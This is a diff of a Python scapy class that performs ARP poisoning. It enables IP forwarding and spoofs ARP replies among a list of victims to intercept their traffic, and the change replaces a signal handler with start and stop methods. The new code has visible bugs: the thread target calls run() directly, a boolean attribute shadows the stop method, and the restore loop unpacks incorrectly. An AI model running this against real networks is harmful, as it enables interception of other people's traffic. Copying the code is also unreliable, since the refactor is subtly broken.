@@ -6,13 +6,15 @@ import time
 from scapy.layers.l2 import arping, Ether, ARP
 
 
-class ArpPois(threading.Thread):
+class ArpPois():
 
     def __init__(self):
         self.victims_ip = None
         self.victims_mac = None
         self.target_ip = None
         self.target_mac = None
+        self.stop = False
+        self.thread = None
 
     def set_victims(self, victims_ip, victims_mac):
         self.victims_ip = victims_ip
@@ -36,19 +38,24 @@ class ArpPois(threading.Thread):
         with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
             ipf.write('1\n')
 
-        def signal_handler(signal, frame):
-            with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
-                ipf.write('0\n')
-
-            for vic_ip, vic_mac in self.victims_ip, self.victims_mac:
-                self.restore(self.target_ip, vic_ip, self.target_mac, vic_mac)
-
-        signal.signal(signal.SIGINT, signal_handler)
-
-        while 1:
+        while not self.stop:
             for ip, mac in zip(self.victims_ip, self.victims_mac):
                 for ip2, mac2 in zip(self.victims_ip, self.victims_mac):
                     if ip != ip2:
-                        print(ip2, ip, mac2, mac)
                         self.poison(ip2, ip, mac2, mac)
             time.sleep(5)
+
+    def start(self):
+        self.stop = False
+        self.thread = threading.Thread(target=self.run())
+        self.thread.start()
+
+    def stop(self):
+        self.stop = True
+        self.thread.join()
+
+        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+            ipf.write('0\n')
+
+        for vic_ip, vic_mac in self.victims_ip, self.victims_mac:
+            self.restore(self.target_ip, vic_ip, self.target_mac, vic_mac)
